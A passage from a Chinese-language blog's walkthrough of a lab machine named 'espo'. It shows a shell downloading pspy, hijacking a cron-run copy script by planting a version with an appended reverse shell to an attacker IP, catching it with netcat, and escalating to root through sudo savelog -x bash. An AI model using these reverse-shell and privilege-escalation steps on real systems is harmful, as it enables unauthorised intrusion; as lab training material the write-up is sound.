-rw-r--r--  1 mandie mandie  220 Dec  4  2023 .bash_logout
-rw-r--r--  1 mandie mandie 3526 Dec  4  2023 .bashrc
drwxr-xr-x  3 mandie mandie 4096 Dec  4  2023 .local
drwxr-xr-x 12 mandie mandie 4096 Dec  4  2023 .oh-my-zsh
-rw-r--r--  1 mandie mandie  807 Dec  4  2023 .profile
-rw-r--r--  1 mandie mandie 3890 Dec  4  2023 .zshrc
-rwxr-xr--  1 mandie mandie  493 Dec  4  2023 copyPics
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 pictures
-rwx------  1 mandie mandie   33 Jan 24  2024 user.txt
drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 videos
www-data@espo:/home/mandie$ cd copyPics 
bash: cd: copyPics: Not a directory
www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2&gt;/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2&gt;/dev/null
    done
done
www-data@espo:/home/mandie$ cd /tmp/
www-data@espo:/tmp$ wget 192.168.205.141/pspy
--2025-01-08 06:56:53--  http://192.168.205.141/pspy
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3518724 (3.4M) [application/octet-stream]
Saving to: 'pspy'

pspy                                                         0%[                                                                       pspy                                                       100%[========================================================================================================================================&gt;]   3.36M  --.-KB/s    in 0.02s   

2025-01-08 06:56:53 (172 MB/s) - 'pspy' saved [3518724/3518724]

www-data@espo:/tmp$ chmod +x pspy 
www-data@espo:/tmp$ ./pspy 
pspy - version: 1.2.1 - Commit SHA: kali


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░   
                               ░ ░   

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/01/08 06:57:08 CMD: UID=33    PID=2064   | ./pspy 
2025/01/08 06:57:08 CMD: UID=0     PID=2048   | /usr/bin/php -f cron.php 
2025/01/08 06:57:08 CMD: UID=0     PID=2047   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php &gt; /dev/null 2&gt;&amp;1 
2025/01/08 06:57:08 CMD: UID=0     PID=2044   | /usr/sbin/CRON -f 
2025/01/08 06:57:08 CMD: UID=33    PID=2015   | bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2014   | sh -c bash 
2025/01/08 06:57:08 CMD: UID=33    PID=2013   | script /dev/null -c bash 
2025/01/08 06:57:08 CMD: UID=0     PID=2011   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1990   | bash -i 
2025/01/08 06:57:08 CMD: UID=33    PID=1989   | bash -c bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1 
2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1" 
2025/01/08 06:57:08 CMD: UID=0     PID=1935   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1873   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1808   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1595   | 
2025/01/08 06:57:08 CMD: UID=0     PID=1273   | 
2025/01/08 06:57:08 CMD: UID=33    PID=1111   | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=109   PID=1042   | qmgr -l -t unix -u 
2025/01/08 06:57:08 CMD: UID=109   PID=1041   | pickup -l -t unix -u -c 
2025/01/08 06:57:08 CMD: UID=0     PID=1039   | /usr/lib/postfix/sbin/master -w 
2025/01/08 06:57:08 CMD: UID=108   PID=673    | /usr/sbin/mariadbd 
2025/01/08 06:57:08 CMD: UID=0     PID=629    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/01/08 06:57:08 CMD: UID=33    PID=609    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=608    | php-fpm: pool www                                                           
2025/01/08 06:57:08 CMD: UID=33    PID=544    | nginx: worker process                          
2025/01/08 06:57:08 CMD: UID=0     PID=540    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/01/08 06:57:08 CMD: UID=0     PID=531    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/01/08 06:57:08 CMD: UID=0     PID=509    | php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                     
2025/01/08 06:57:08 CMD: UID=0     PID=489    | /usr/sbin/ModemManager 
2025/01/08 06:57:08 CMD: UID=0     PID=461    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2025/01/08 06:57:08 CMD: UID=0     PID=432    | 
2025/01/08 06:57:08 CMD: UID=0     PID=421    | /lib/systemd/systemd-logind 
2025/01/08 06:57:08 CMD: UID=996   PID=414    | /usr/lib/polkit-1/polkitd --no-debug 
2025/01/08 06:57:08 CMD: UID=100   PID=411    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                    
2025/01/08 06:57:08 CMD: UID=0     PID=410    | /usr/sbin/cron -f 
2025/01/08 06:57:08 CMD: UID=0     PID=389    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                 
2025/01/08 06:57:08 CMD: UID=0     PID=303    | 
2025/01/08 06:57:08 CMD: UID=997   PID=284    | /lib/systemd/systemd-timesyncd 
2025/01/08 06:57:08 CMD: UID=0     PID=242    | /lib/systemd/systemd-udevd 
2025/01/08 06:57:08 CMD: UID=0     PID=218    | /lib/systemd/systemd-journald 
2025/01/08 06:57:08 CMD: UID=0     PID=174    | 
2025/01/08 06:57:08 CMD: UID=0     PID=173    | 
2025/01/08 06:57:08 CMD: UID=0     PID=141    | 
2025/01/08 06:57:08 CMD: UID=0     PID=134    | 
2025/01/08 06:57:08 CMD: UID=0     PID=133    | 
2025/01/08 06:57:08 CMD: UID=0     PID=132    | 
2025/01/08 06:57:08 CMD: UID=0     PID=131    | 
2025/01/08 06:57:08 CMD: UID=0     PID=130    | 
2025/01/08 06:57:08 CMD: UID=0     PID=129    | 
2025/01/08 06:57:08 CMD: UID=0     PID=126    | 
2025/01/08 06:57:08 CMD: UID=0     PID=59     | 
2025/01/08 06:57:08 CMD: UID=0     PID=58     | 
2025/01/08 06:57:08 CMD: UID=0     PID=53     | 
2025/01/08 06:57:08 CMD: UID=0     PID=48     | 
2025/01/08 06:57:08 CMD: UID=0     PID=47     | 
2025/01/08 06:57:08 CMD: UID=0     PID=46     | 
2025/01/08 06:57:08 CMD: UID=0     PID=44     | 
2025/01/08 06:57:08 CMD: UID=0     PID=38     | 
2025/01/08 06:57:08 CMD: UID=0     PID=37     | 
2025/01/08 06:57:08 CMD: UID=0     PID=36     | 
2025/01/08 06:57:08 CMD: UID=0     PID=35     | 
2025/01/08 06:57:08 CMD: UID=0     PID=34     | 
2025/01/08 06:57:08 CMD: UID=0     PID=33     | 
2025/01/08 06:57:08 CMD: UID=0     PID=32     | 
2025/01/08 06:57:08 CMD: UID=0     PID=31     | 
2025/01/08 06:57:08 CMD: UID=0     PID=30     | 
2025/01/08 06:57:08 CMD: UID=0     PID=29     | 
2025/01/08 06:57:08 CMD: UID=0     PID=28     | 
2025/01/08 06:57:08 CMD: UID=0     PID=27     | 
2025/01/08 06:57:08 CMD: UID=0     PID=24     | 
2025/01/08 06:57:08 CMD: UID=0     PID=23     | 
2025/01/08 06:57:08 CMD: UID=0     PID=22     | 
2025/01/08 06:57:08 CMD: UID=0     PID=21     | 
2025/01/08 06:57:08 CMD: UID=0     PID=20     | 
2025/01/08 06:57:08 CMD: UID=0     PID=18     | 
2025/01/08 06:57:08 CMD: UID=0     PID=16     | 
2025/01/08 06:57:08 CMD: UID=0     PID=15     | 
2025/01/08 06:57:08 CMD: UID=0     PID=14     | 
2025/01/08 06:57:08 CMD: UID=0     PID=13     | 
2025/01/08 06:57:08 CMD: UID=0     PID=12     | 
2025/01/08 06:57:08 CMD: UID=0     PID=11     | 
2025/01/08 06:57:08 CMD: UID=0     PID=10     | 
2025/01/08 06:57:08 CMD: UID=0     PID=6      | 
2025/01/08 06:57:08 CMD: UID=0     PID=5      | 
2025/01/08 06:57:08 CMD: UID=0     PID=4      | 
2025/01/08 06:57:08 CMD: UID=0     PID=3      | 
2025/01/08 06:57:08 CMD: UID=0     PID=2      | 
2025/01/08 06:57:08 CMD: UID=0     PID=1      | /sbin/init 
2025/01/08 06:58:01 CMD: UID=0     PID=2072   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2071   | /usr/sbin/cron -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2073   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2075   | /usr/sbin/CRON -f 
2025/01/08 06:58:01 CMD: UID=0     PID=2077   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php &gt; /dev/null 2&gt;&amp;1 
2025/01/08 06:58:01 CMD: UID=1000  PID=2076   | /bin/sh -c /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2078   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2079   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2080   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2081   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2082   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2083   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2084   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2085   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; 
2025/01/08 06:58:01 CMD: UID=1000  PID=2086   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2087   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2088   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2089   | /bin/bash /home/mandie/copyPics 
2025/01/08 06:58:01 CMD: UID=1000  PID=2090   | /bin/bash /home/mandie/copyPics 
^CExiting program... (interrupt)

</code></pre>
<p>有定时任务用<code class="notranslate">UID1000</code>的用户执行<code class="notranslate">/home/mandie/copyPics</code>，<code class="notranslate">copyPics</code>的内容</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@espo:/home/mandie$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2&gt;/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2&gt;/dev/null
    done
done
</code></pre>
<p>实现了从一个目录 <code class="notranslate">/var/shared_medias</code> 中筛选不可执行文件，并把文件复制到用户的家目录下。那我们可以尝试在<code class="notranslate">/var/shared_medias</code>中创建一个<code class="notranslate">copyPics</code>文件，并在里面加点料</p>
<pre lang="bash" class="notranslate"><code class="notranslate">www-data@espo:/tmp$ ls -la /var/shared_medias
total 7792
drwxrwxrwt  2 root root    4096 Jan 24  2024 .
drwxr-xr-x 13 root root    4096 Dec  7  2023 ..
-rw-r--r--  1 root root   61521 Dec  4  2023 bedroom.jpg
-rw-r--r--  1 root root  298808 Dec  4  2023 burger.jpeg
-rw-r--r--  1 root root  236712 Dec  4  2023 dad-baby.jpg
-rw-r--r--  1 root root   61324 Dec  4  2023 dorothy.jpeg
-rw-r--r--  1 root root  268188 Dec  4  2023 family.jpg
-rw-r--r--  1 root root  251902 Dec  4  2023 maldives.jpg
-rw-r--r--  1 root root 6779935 Dec  4  2023 sky.mp4
www-data@espo:/tmp$ cd /var/shared_medias
www-data@espo:/var/shared_medias$ cp /home/mandie/copyPics .
www-data@espo:/var/shared_medias$ nano copyPics 
www-data@espo:/var/shared_medias$ cat copyPics 
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2&gt;/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2&gt;/dev/null
    done
done


bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/9999 0&gt;&amp;1"
</code></pre>
<p>让子弹飞会</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 43262
bash: cannot set terminal process group (2562): Inappropriate ioctl for device
bash: no job control in this shell
mandie@espo:~$ id
uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)

</code></pre>
<p>获得一下稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
</code></pre>
<p>尝试提权</p>
<pre lang="bash" class="notranslate"><code class="notranslate">mandie@espo:~$ sudo -l
sudo: unable to resolve host espo: Name or service not known
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    (ALL : ALL) NOPASSWD: /usr/bin/savelog
mandie@espo:~$ /usr/bin/savelog -h
Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...
        -m mode    - chmod log files to mode
        -u user    - chown log files to user
        -g group   - chgrp log files to group
        -c cycle   - save cycle versions of the logfile (default: 7)
        -r rolldir - use rolldir instead of . to roll files
        -C         - force cleanup of cycled logfiles
        -d         - use standard date for rolling
        -D         - override date format for -d
        -t         - touch file
        -l         - don't compress any log files (default: compress)
        -p         - preserve mode/user/group of original file
        -j         - use bzip2 instead of gzip
        -J         - use xz instead of gzip
        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)
        -x script  - invoke script with rotated log file in $FILE
        -n         - do not rotate empty files
        -q         - suppress rotation message
        file       - log file names

# 翻译
用法： savelog [-m 模式] [-u 用户] [-g 组] [-t] [-c 循环] [-p]
             [-j][-C][-d][-l][-r 滚动目录][-n][-q] 文件 ...
        -m mode - chmod 日志文件模式
        -u 用户 - 将日志文件上传到用户
        -g group - 要分组的 chgrp 日志文件
        -c cycle - 保存日志文件的循环版本（默认值：7）
        -r rolldir - 使用 rolldir 而不是 .滚动文件
        -C - 强制清理循环的日志文件
        -d - 使用标准日期进行滚动
        -D - 覆盖 -d 的日期格式
        -t - 触摸文件
        -l - 不压缩任何日志文件（默认：compress）
        -p - 保留原始文件的模式/用户/组
        -j - 使用 bzip2 而不是 gzip
        -J - 使用 xz 而不是 gzip
        -1 ..-9 - 压缩强度或内存使用率（默认值：9，xz 除外）
        -x script - 使用$FILE中旋转的日志文件调用脚本
        -n - 不旋转空文件
        -q - 禁止旋转消息
        file - 日志文件名

</code></pre>
<p><code class="notranslate">-x</code>我们比较感兴趣，试试行不行</p>
<pre lang="bash" class="notranslate"><code class="notranslate">mandie@espo:~$ find / -name "*.log" 2&gt;/dev/null
/var/www/html/data/logs/espo-2023-12-04.log
/var/www/html/data/logs/espo-2025-01-08.log
/var/www/html/data/logs/espo-2024-01-24.log
/var/log/alternatives.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/dpkg.log
/var/log/php8.2-fpm.log
/var/lib/mysql/ddl_recovery-backup.log
/var/lib/mysql/ddl_recovery.log
mandie@espo:~$ sudo /usr/bin/savelog -x bash /var/log/nginx/access.log
sudo: unable to resolve host espo: Name or service not known
root@espo:/home/mandie# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>成功提权</p>
<h1>5.后话</h1>
<p>看了一下<code class="notranslate">HGBE</code>大佬的wp，才发现群主<code class="notranslate">ll104567</code>发现了一个定时任务直接获取 root</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d"><img src="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d" alt="image" style="max-width: 100%;"></a></p>
<p>甚至在<code class="notranslate">www-data</code>权限的时候就可以直接提权到<code class="notranslate">root</code><br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95"><img src="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95" alt="C4" style="max-width: 100%;"></a></p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.disabled=true;
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}



</script>
</script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>

</html>
